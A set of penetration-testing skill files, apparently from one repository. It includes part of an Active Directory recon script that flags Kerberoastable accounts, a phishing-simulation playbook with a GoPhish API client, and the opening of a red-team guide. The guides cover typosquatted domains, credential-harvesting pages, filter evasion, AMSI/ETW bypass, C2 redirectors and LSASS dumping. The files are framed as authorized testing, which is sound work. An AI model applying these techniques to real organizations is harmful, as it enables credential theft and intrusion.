        "asrep_roastable_accounts": [u["samaccountname"] for u in asrep],
        "high_value_groups": {g: len(m) for g, m in groups.items()},
        "dc_smb_signing_required": smb_signing,
        "risk_summary": [],
    }
    if kerberoastable:
        report["risk_summary"].append(
            f"CRITICAL: {len(kerberoastable)} accounts are Kerberoastable"
        )
    if asrep:
        report["risk_summary"].append(
            f"HIGH: {len(asrep)} accounts lack Kerberos pre-authentication"
        )
    if not smb_signing:
        report["risk_summary"].append("HIGH: SMB signing not required on DC - relay attacks possible")
    return report


def main():
    parser = argparse.ArgumentParser(description="AD Attack Simulation Agent")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP")
    parser.add_argument("--domain", required=True, help="Domain FQDN (e.g., corp.local)")
    parser.add_argument("--username", required=True, help="Low-privilege domain username")
    parser.add_argument("--password", required=True, help="Domain user password")
    parser.add_argument("--output", default="ad_assessment.json", help="Output JSON report path")
    args = parser.parse_args()

    logger.info("Starting AD attack simulation against %s", args.domain)
    users = ldap_enum_users(args.dc_ip, args.domain, args.username, args.password)
    groups = enum_groups(args.dc_ip, args.domain, args.username, args.password)
    report = generate_report(users, groups, args.dc_ip)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/executing-phishing-simulation-campaign/SKILL.md =====
---
name: executing-phishing-simulation-campaign
description: 'Executes authorized phishing simulation campaigns to assess an organization''s
  susceptibility to email-based social engineering attacks. The tester designs realistic
  phishing scenarios, builds credential harvesting infrastructure, sends targeted
  phishing emails, and tracks open rates, click-through rates, and credential submission
  rates to measure human security awareness. Activates for requests involving phishing
  simulation, social engineering assessment, email security testing, or security awareness
  measurement.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- phishing-simulation
- social-engineering
- GoPhish
- email-security
- security-awareness
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1003
mitre_f3:
  version: '1.1'
  tactics:
  - reconnaissance
  - resource-development
  - initial-access
  - positioning
  techniques:
  - id: T1598
    name: Phishing for Information
    tactic: reconnaissance
    source: attack
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
  - id: F1020.002
    name: 'Create Fake Materials: Fake Website'
    tactic: resource-development
    source: f3
  - id: T1583.001
    name: 'Acquire Infrastructure: Domains'
    tactic: resource-development
    source: attack
  - id: T1557
    name: Adversary-in-the-Middle
    tactic: initial-access
    source: attack
  - id: F1004
    name: Access with Stolen Session Cookie
    tactic: initial-access
    source: f3
---
# Executing Phishing Simulation Campaign

## When to Use

- Measuring employee susceptibility to phishing attacks as part of a security awareness program
- Testing the effectiveness of email security controls (secure email gateway, DMARC, SPF, DKIM)
- Conducting the social engineering component of a red team exercise to gain initial access
- Establishing a baseline for phishing susceptibility before deploying security awareness training
- Validating that incident response procedures work when employees report suspicious emails

**Do not use** without explicit written authorization from the organization's leadership, for actual credential theft beyond the authorized scope, for targeting individuals personally rather than professionally, or for sending phishing emails that could cause psychological harm or legal liability.

## Prerequisites

- Written authorization from executive leadership specifying the campaign scope, target groups, and escalation procedures
- Coordination with the IT/security team to whitelist the sending infrastructure (or test whether it bypasses controls, depending on scope)
- GoPhish or equivalent phishing platform configured with a sending domain, SMTP relay, and landing page infrastructure
- Phishing domain registered and configured with SPF, DKIM, and DMARC records to maximize deliverability
- Employee email list from HR, organized by department for targeted campaigns
- Incident response team briefed on the campaign timeline and escalation procedures

## Workflow

### Step 1: Campaign Planning and Pretext Development

Design realistic phishing scenarios based on threats relevant to the target organization:

- **Pretext selection**: Choose scenarios that mirror real-world attacks:
  - IT support: Password expiration notice requiring immediate action
  - HR department: Benefits enrollment, policy acknowledgment, W-2/tax document
  - Executive impersonation: Urgent request from CEO/CFO to review a document
  - Vendor/supplier: Invoice requiring review, delivery notification
  - Cloud services: Microsoft 365 shared document, Google Drive access, Zoom meeting invitation
- **Target segmentation**: Divide employees into groups by department, role, or access level. High-value targets (finance, IT admin, executives) may receive more sophisticated pretexts.
- **Timing**: Schedule sends during business hours, preferably Tuesday-Thursday when email engagement is highest. Avoid holidays, mass layoff periods, or other sensitive times.
- **Success metrics**: Define what constitutes campaign success: email open rate, link click rate, credential submission rate, report rate (employees who report the phish to IT)

### Step 2: Infrastructure Setup

Configure the phishing infrastructure:

- **Domain registration**: Register a domain that resembles the target organization's domain (typosquatting, homograph, or brand-adjacent). Examples: `target-corp.com`, `targetcorp-portal.com`, `targetsupport.net`
- **SSL certificate**: Obtain a TLS certificate for the phishing domain (Let's Encrypt) to display the padlock icon
- **GoPhish configuration**:
  - Set up the GoPhish server on a VPS with the phishing domain
  - Configure the SMTP sending profile with the phishing domain's mail server
  - Create the email template with tracking pixel and link to the landing page
  - Build the credential harvesting landing page that mirrors the target's login portal
  - Import the target email list and create user groups
- **Email authentication**: Configure SPF, DKIM, and DMARC records for the phishing domain to pass email authentication checks and improve delivery rates
- **Test delivery**: Send test emails to a controlled inbox to verify rendering, link tracking, and landing page functionality

### Step 3: Campaign Execution

Launch the phishing campaign:

- Send emails in batches to avoid triggering rate limits or spam filters (e.g., 50 emails per hour)
- Monitor GoPhish dashboard in real-time for delivery failures, bounces, and early interactions
- Track metrics as they come in: emails sent, emails opened (tracking pixel fired), links clicked, credentials submitted
- If the IT security team or SOC detects the campaign (if this is part of the test), document the detection time and response actions
- Maintain an emergency stop procedure: if an employee becomes distressed or the campaign creates unintended consequences, pause immediately
- Run the campaign for 48-72 hours before closing the landing page, as most interactions occur within the first 24 hours

### Step 4: Credential Capture and Access Demonstration

Process captured credentials to demonstrate impact (if authorized):

- Review all captured credentials in GoPhish. Do not test credentials against real systems unless explicitly authorized.
- If authorized for full exploitation: test captured credentials against the organization's actual login portal (VPN, OWA, SSO)
- Document any accounts that were successfully compromised, what data they could access, and whether MFA was present
- If MFA blocks access, document that MFA prevented the compromise and recommend maintaining MFA enforcement
- Identify patterns in credential submissions: which departments, roles, or locations are most susceptible

### Step 5: Analysis and Reporting

Analyze campaign results and produce the assessment report:

- **Metrics analysis**:
  - Email delivery rate: percentage of emails that reached inboxes
  - Open rate: percentage of recipients who opened the email
  - Click rate: percentage who clicked the phishing link
  - Submission rate: percentage who submitted credentials
  - Report rate: percentage who reported the email to IT security
- **Departmental comparison**: Compare susceptibility rates across departments to identify groups needing targeted training
- **Email security effectiveness**: Document whether the phishing emails bypassed the secure email gateway, whether DMARC/SPF prevented delivery, and whether link scanning tools detected the phishing URL
- **Recommendations**: Provide actionable recommendations including security awareness training topics, technical controls improvements, and policy changes

## Key Concepts

| Term | Definition |
|------|------------|
| **Pretext** | The fabricated scenario and social context used to persuade the target to take a desired action such as clicking a link or entering credentials |
| **Credential Harvesting** | Collecting usernames and passwords through fake login pages that mimic legitimate services |
| **GoPhish** | Open-source phishing simulation platform that manages email templates, landing pages, target groups, and campaign tracking |
| **Spear Phishing** | Targeted phishing directed at specific individuals using personalized information gathered through reconnaissance |
| **Typosquatting** | Registering domains that are visually similar to legitimate domains through character substitution, addition, or omission |
| **Security Awareness** | Training programs designed to educate employees about social engineering threats and proper reporting procedures |
| **DMARC** | Domain-based Message Authentication, Reporting, and Conformance; email authentication protocol that prevents unauthorized use of a domain for sending email |

## Tools & Systems

- **GoPhish**: Open-source phishing simulation framework providing campaign management, email templates, landing pages, and detailed analytics
- **Evilginx2**: Advanced phishing framework capable of capturing session tokens and bypassing multi-factor authentication through reverse proxy technique
- **King Phisher**: Phishing campaign toolkit with advanced features including two-factor authentication testing and geolocation tracking
- **SET (Social Engineering Toolkit)**: Framework for social engineering attacks including phishing, credential harvesting, and payload delivery

## Common Scenarios

### Scenario: Enterprise Phishing Simulation for Security Awareness Baseline

**Context**: A 2,000-employee company has never conducted a phishing simulation. The CISO wants to establish a baseline susceptibility rate before deploying a new security awareness training program. The campaign should test all employees using a realistic but not overly sophisticated pretext.

**Approach**:
1. Develop a Microsoft 365 password expiration pretext: "Your password expires in 24 hours. Click here to update."
2. Register `m365-targetcorp.com`, set up GoPhish, and build a landing page cloning the Microsoft 365 login portal
3. Import all 2,000 employee emails and schedule sends in batches of 100 over 20 hours
4. Campaign results after 72 hours: 1,847 delivered (92.4%), 1,243 opened (67.3%), 487 clicked (26.4%), 312 submitted credentials (16.9%), 23 reported to IT (1.2%)
5. Analysis reveals Finance (28% submission) and Marketing (24% submission) have the highest susceptibility; IT department has the lowest (4%)
6. Recommend targeted training for high-susceptibility departments, phishing report button deployment, and quarterly simulation cadence

**Pitfalls**:
- Using overly aggressive or threatening pretexts that cause employee anxiety or legal issues
- Not coordinating with HR and legal before launching the campaign, risking employee relations problems
- Sending all emails simultaneously, overwhelming the email server or triggering bulk-send detection
- Focusing only on click and submission rates while ignoring the critically low report rate (1.2%)

## Output Format

```
## Phishing Simulation Campaign Report

**Campaign Name**: Q4 2025 Baseline Phishing Assessment
**Pretext**: Microsoft 365 Password Expiration Notice
**Campaign Duration**: November 15-18, 2025
**Target Population**: 2,000 employees (all departments)

### Campaign Metrics
| Metric | Count | Rate |
|--------|-------|------|
| Emails Sent | 2,000 | 100% |
| Emails Delivered | 1,847 | 92.4% |
| Emails Opened | 1,243 | 67.3% |
| Links Clicked | 487 | 26.4% |
| Credentials Submitted | 312 | 16.9% |
| Reported to IT | 23 | 1.2% |

### Department Breakdown
| Department | Employees | Clicked | Submitted | Reported |
|------------|-----------|---------|-----------|----------|
| Finance    | 120       | 38.3%   | 28.3%     | 0.8%     |
| Marketing  | 85        | 35.3%   | 24.7%     | 1.2%     |
| Engineering| 300       | 15.0%   | 8.3%      | 3.7%     |
| IT         | 45        | 8.9%    | 4.4%      | 11.1%    |

### Key Findings
1. Baseline credential submission rate of 16.9% exceeds industry average (12%)
2. Report rate of 1.2% indicates employees are not trained to report suspicious emails
3. Finance department is the highest-risk group with 28.3% credential submission rate
4. Email security gateway did not flag the phishing domain despite being registered 48 hours prior

### Recommendations
1. Deploy mandatory security awareness training with emphasis on phishing identification
2. Install a phishing report button in email clients and train all employees on its use
3. Implement DMARC enforcement (p=reject) and enhanced email filtering rules
4. Conduct targeted training for Finance and Marketing departments
5. Schedule quarterly phishing simulations to track improvement
```

===== END FILE =====


===== FILE: skills/executing-phishing-simulation-campaign/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/executing-phishing-simulation-campaign/references/api-reference.md =====
# API Reference: Phishing Simulation Campaign Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | HTTP client for GoPhish REST API |

## CLI Usage

```bash
# List campaigns
python scripts/agent.py --gophish-url https://gophish.lab:3333 --api-key KEY --action list

# Get campaign results
python scripts/agent.py --gophish-url https://gophish.lab:3333 --api-key KEY \
  --action results --campaign-id 1 --output report.json
```

## GoPhishClient Class

### `__init__(base_url, api_key, verify_ssl=False)`
Initializes the session with Bearer token auth for the GoPhish API.

### `create_sending_profile(name, smtp_from, host, username, password) -> dict`
Creates an SMTP sending profile. GoPhish API: `POST /api/smtp/`.

### `create_email_template(name, subject, html_body, text_body) -> dict`
Creates a phishing email template with credential capture enabled. API: `POST /api/templates/`.

### `create_landing_page(name, html, capture_creds, redirect_url) -> dict`
Creates a credential harvesting page. API: `POST /api/pages/`.

### `import_targets(group_name, targets) -> dict`
Imports a target list as a GoPhish group. Each target: `{email, first_name, last_name, position}`.

### `launch_campaign(name, template_id, page_id, smtp_id, group_ids, url) -> dict`
Launches a phishing campaign. API: `POST /api/campaigns/`.

### `get_campaign_results(campaign_id) -> dict`
Fetches campaign timeline and per-target results. API: `GET /api/campaigns/{id}/results`.

## `compute_metrics(results) -> dict`
Calculates click rate, submission rate, and report rate from campaign timeline events.

## GoPhish API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/campaigns/` | GET/POST | List or create campaigns |
| `/api/campaigns/{id}/results` | GET | Campaign results with timeline |
| `/api/templates/` | POST | Create email templates |
| `/api/pages/` | POST | Create landing pages |
| `/api/smtp/` | POST | Create SMTP profiles |
| `/api/groups/` | POST | Create target groups |

===== END FILE =====


===== FILE: skills/executing-phishing-simulation-campaign/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""Phishing simulation campaign agent using requests to interact with GoPhish API."""

import argparse
import json
import logging
import sys
from datetime import datetime

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


class GoPhishClient:
    """Client for the GoPhish REST API."""

    def __init__(self, base_url: str, api_key: str, verify_ssl: bool = False):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"Authorization": f"Bearer {api_key}"})
        self.session.verify = verify_ssl

    def _get(self, endpoint: str) -> dict:
        resp = self.session.get(f"{self.base_url}/api/{endpoint}", timeout=30)
        resp.raise_for_status()
        return resp.json()

    def _post(self, endpoint: str, data: dict) -> dict:
        resp = self.session.post(f"{self.base_url}/api/{endpoint}", json=data, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def create_sending_profile(self, name: str, smtp_from: str, host: str,
                                username: str, password: str) -> dict:
        """Create an SMTP sending profile."""
        payload = {
            "name": name,
            "from_address": smtp_from,
            "host": host,
            "username": username,
            "password": password,
            "ignore_cert_errors": True,
        }
        result = self._post("smtp/", payload)
        logger.info("Created sending profile: %s (id=%s)", name, result.get("id"))
        return result

    def create_email_template(self, name: str, subject: str, html_body: str,
                               text_body: str = "") -> dict:
        """Create a phishing email template with tracking."""
        payload = {
            "name": name,
            "subject": subject,
            "html": html_body,
            "text": text_body,
            "capture_credentials": True,
            "capture_passwords": True,
        }
        result = self._post("templates/", payload)
        logger.info("Created email template: %s (id=%s)", name, result.get("id"))
        return result

    def create_landing_page(self, name: str, html: str, capture_creds: bool = True,
                             redirect_url: str = "") -> dict:
        """Create a credential harvesting landing page."""
        payload = {
            "name": name,
            "html": html,
            "capture_credentials": capture_creds,
            "capture_passwords": True,
            "redirect_url": redirect_url,
        }
        result = self._post("pages/", payload)
        logger.info("Created landing page: %s (id=%s)", name, result.get("id"))
        return result

    def import_targets(self, group_name: str, targets: list) -> dict:
        """Import target email list as a user group."""
        payload = {
            "name": group_name,
            "targets": [{"email": t["email"], "first_name": t.get("first_name", ""),
                         "last_name": t.get("last_name", ""), "position": t.get("position", "")}
                        for t in targets],
        }
        result = self._post("groups/", payload)
        logger.info("Created target group '%s' with %d targets", group_name, len(targets))
        return result

    def launch_campaign(self, name: str, template_id: int, page_id: int,
                         smtp_id: int, group_ids: list, url: str) -> dict:
        """Launch the phishing campaign."""
        payload = {
            "name": name,
            "template": {"id": template_id},
            "page": {"id": page_id},
            "smtp": {"id": smtp_id},
            "groups": [{"id": gid} for gid in group_ids],
            "url": url,
            "launch_date": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00"),
        }
        result = self._post("campaigns/", payload)
        logger.info("Launched campaign '%s' (id=%s)", name, result.get("id"))
        return result

    def get_campaign_results(self, campaign_id: int) -> dict:
        """Retrieve campaign results and metrics."""
        return self._get(f"campaigns/{campaign_id}/results")

    def get_campaign_summary(self, campaign_id: int) -> dict:
        """Get summary statistics for a campaign."""
        result = self._get(f"campaigns/{campaign_id}/summary")
        return result

    def list_campaigns(self) -> list:
        """List all campaigns."""
        return self._get("campaigns/")


def compute_metrics(results: dict) -> dict:
    """Compute phishing simulation success metrics from campaign results."""
    timeline = results.get("timeline", [])
    total = results.get("stats", {}).get("total", 0)
    sent = sum(1 for e in timeline if e.get("message") == "Email Sent")
    opened = sum(1 for e in timeline if e.get("message") == "Email Opened")
    clicked = sum(1 for e in timeline if e.get("message") == "Clicked Link")
    submitted = sum(1 for e in timeline if e.get("message") == "Submitted Data")
    reported = sum(1 for e in timeline if e.get("message") == "Email Reported")

    return {
        "total_targets": total,
        "emails_sent": sent,
        "emails_opened": opened,
        "links_clicked": clicked,
        "credentials_submitted": submitted,
        "reported_to_it": reported,
        "click_rate": f"{(clicked / total * 100):.1f}%" if total else "0%",
        "submission_rate": f"{(submitted / total * 100):.1f}%" if total else "0%",
        "report_rate": f"{(reported / total * 100):.1f}%" if total else "0%",
    }


def main():
    parser = argparse.ArgumentParser(description="Phishing Simulation Campaign Agent")
    parser.add_argument("--gophish-url", required=True, help="GoPhish server URL")
    parser.add_argument("--api-key", required=True, help="GoPhish API key")
    parser.add_argument("--action", choices=["launch", "results", "list"], default="list")
    parser.add_argument("--campaign-id", type=int, help="Campaign ID for results")
    parser.add_argument("--output", default="phishing_report.json")
    args = parser.parse_args()

    client = GoPhishClient(args.gophish_url, args.api_key)

    if args.action == "list":
        campaigns = client.list_campaigns()
        print(json.dumps(campaigns, indent=2, default=str))
    elif args.action == "results" and args.campaign_id:
        results = client.get_campaign_results(args.campaign_id)
        metrics = compute_metrics(results)
        with open(args.output, "w") as f:
            json.dump(metrics, f, indent=2)
        logger.info("Metrics saved to %s", args.output)
        print(json.dumps(metrics, indent=2))
    else:
        parser.print_help()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/executing-red-team-exercise/SKILL.md =====
---
name: executing-red-team-exercise
description: 'Run a stealthy, MITRE ATT&CK-mapped adversary emulation against an organization''s
  people, processes, and technology, using C2 infrastructure (Cobalt Strike, Sliver, Brute
  Ratel, Mythic) through the full attack lifecycle to test SOC detection and response rather
  than just find vulnerabilities. Use when executing a full-scope red team exercise, adversary
  simulation/emulation, or a regulatory exercise (TIBER-EU, CBEST, AASE, iCAST) with executive
  authorization and a signed Rules of Engagement already in place.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- red-team
- adversary-emulation
- MITRE-ATT&CK
- Cobalt-Strike
- detection-assessment
version: 1.0.0
author: mahipal
license: Apache-2.0
d3fend_techniques:
- File Metadata Consistency Validation
- Application Protocol Command Analysis
- Identifier Analysis
- Content Format Conversion
- Message Analysis
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1592
---
# Executing Red Team Exercise

## When to Use

- Assessing an organization's ability to detect, respond to, and contain a realistic adversary operation
- Testing the effectiveness of the security operations center (SOC), incident response team, and threat hunting capabilities
- Validating security investments by simulating attacks that chain multiple vulnerabilities and techniques
- Evaluating the organization's security posture against specific threat actors (nation-state, ransomware groups, insider threats)
- Meeting regulatory requirements for adversary simulation (TIBER-EU, CBEST, AASE, iCAST)

**Do not use** without executive-level authorization and a detailed Rules of Engagement document, against systems where disruption could affect safety or critical operations, or as a replacement for basic vulnerability management (fix known vulnerabilities first).

## Prerequisites

- Executive-level written authorization with clearly defined objectives, scope, and off-limits systems
- Red team command and control (C2) infrastructure: primary and backup C2 channels with domain fronting or redirectors
- Operator workstations with OPSEC-hardened toolsets (Cobalt Strike, Sliver, Brute Ratel, or Mythic)
- Threat intelligence on adversary groups relevant to the target organization for adversary emulation planning
- Trusted agent (white cell) within the target organization who manages the exercise boundaries without alerting defenders
- MITRE ATT&CK matrix for mapping planned and executed techniques


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Adversary Emulation Planning

Develop the operation plan based on a realistic threat model:

- **Threat actor selection**: Select an adversary group relevant to the organization's industry. For financial services, emulate FIN7 or Lazarus Group. For healthcare, emulate APT41 or FIN12. Map the selected adversary's known TTPs from MITRE ATT&CK.
- **Objective definition**: Define measurable objectives such as "Access customer financial data from the core banking system" or "Demonstrate ability to deploy ransomware across the domain"
- **Attack plan development**: Create a step-by-step operation plan mapping each phase to ATT&CK tactics:
  1. Initial Access (TA0001): Phishing, exploiting public-facing applications, or supply chain compromise
  2. Execution (TA0002): PowerShell, scripting, exploitation for client execution
  3. Persistence (TA0003): Scheduled tasks, registry modifications, implant deployment
  4. Privilege Escalation (TA0004): Token impersonation, exploitation for privilege escalation
  5. Defense Evasion (TA0005): Process injection, timestomping, indicator removal
  6. Credential Access (TA0006): LSASS dumping, Kerberoasting, credential stuffing
  7. Lateral Movement (TA0008): Remote services, pass-the-hash, remote desktop
  8. Collection/Exfiltration (TA0009/TA0010): Data staging, exfiltration over C2
- **Deconfliction plan**: Establish procedures for the white cell to distinguish red team activity from actual threats

### Step 2: Infrastructure Preparation

Build OPSEC-hardened attack infrastructure:

- **C2 infrastructure**: Deploy primary C2 server behind redirectors that filter Blue Team investigation traffic. Use domain fronting or legitimate cloud services (Azure CDN, CloudFront) to blend C2 traffic with normal web traffic.
- **Phishing infrastructure**: Register aged domains (30+ days old), configure SPF/DKIM/DMARC, and build credential harvesting or payload delivery pages
- **Payload development**: Create custom implants or configure C2 framework payloads with:
  - AMSI bypass for PowerShell execution
  - ETW patching to evade security product telemetry
  - Sleep masking and memory encryption to defeat memory scanning
  - Signed binary proxy execution (rundll32, msbuild, regsvr32) for defense evasion
- **Staging infrastructure**: Set up file hosting for second-stage payloads, exfiltration drop servers, and backup communication channels
- **OPSEC verification**: Test the entire infrastructure against the same EDR/AV products deployed in the target environment before going live

### Step 3: Initial Access

Gain initial foothold in the target environment:

- **Phishing campaign**: Send targeted spear-phishing emails to selected employees with weaponized documents or credential harvesting links. Use pretexts based on OSINT gathered during reconnaissance.
- **External exploitation**: Exploit vulnerabilities in internet-facing applications (VPN portals, web applications, email servers) identified during reconnaissance
- **Physical access**: If in scope, attempt physical access to deploy network implants (LAN Turtle, Bash Bunny) or USB drops
- **Supply chain**: If in scope, compromise a vendor or supplier relationship to gain indirect access
- Upon successful initial access, establish the first C2 beacon and confirm communication with the C2 server. Immediately implement persistence (multiple mechanisms) to survive reboots and credential changes.

### Step 4: Post-Exploitation and Objective Completion

Operate within the target environment while maintaining stealth:

- **Internal reconnaissance**: Enumerate the domain, identify high-value targets, and map the network using BloodHound and internal scanning, with traffic designed to blend with normal administrative activity
- **Privilege escalation**: Escalate from initial user to local admin, then to domain admin, using the least detectable techniques (Kerberoasting over pass-the-hash, living-off-the-land over custom tools)
- **Lateral movement**: Move to target systems using legitimate protocols (RDP, WinRM, SMB) with stolen credentials. Vary techniques to test multiple detection signatures.
- **Defense evasion**: Continuously adapt to avoid detection. If a technique triggers an alert, note the detection and switch to an alternative approach.
- **Objective execution**: Complete the defined objectives (access target data, demonstrate ransomware staging, exfiltrate data) and document evidence of achievement
- **Detection timeline**: Record timestamps for every technique executed to later compare against Blue Team's detection timeline

### Step 5: Purple Team Integration and Reporting

Convert red team findings into defensive improvements:

- **Detection gap analysis**: Compare the red team's technique timeline against the Blue Team's detection log. Identify which techniques were detected, which were missed, and the mean time to detect (MTTD) for each.
